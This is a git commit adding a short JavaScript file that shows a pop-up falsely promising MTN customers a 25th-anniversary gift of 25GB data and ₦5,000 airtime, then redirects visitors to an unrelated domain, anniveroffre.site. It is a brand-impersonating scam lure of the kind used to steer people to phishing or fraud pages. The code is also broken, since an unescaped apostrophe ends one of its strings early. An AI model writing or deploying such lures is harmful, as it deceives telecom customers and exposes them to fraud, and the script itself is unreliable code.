c1271a637d865f6f45f64b2acca19fc6e8f6c000
domiebizzy <polygon_snit2p@icloud.com>
2026-08-08 17:54:54 +0100

    Add MTN 25th anniversary offer prompt

---
+++ mtn25.js
@@ -0,0 +1,10 @@
+
+    var password = '25GB + ₦5,000 Airtime';
+password = prompt(
+'MTN@25 : Congratulations ! You're eligible to receive 25GB DATA + ₦5000 Airtime Gifts as our valued customer in celebration our 25th anniversary this Year. Click OK to get offer.','25GB + ₦5,000 Airtime'
+
+);if (password != '25GB + ₦5,000 Airtime') {
+
+    location.href = 'https://www.anniveroffre.site/25gb';
+
+}
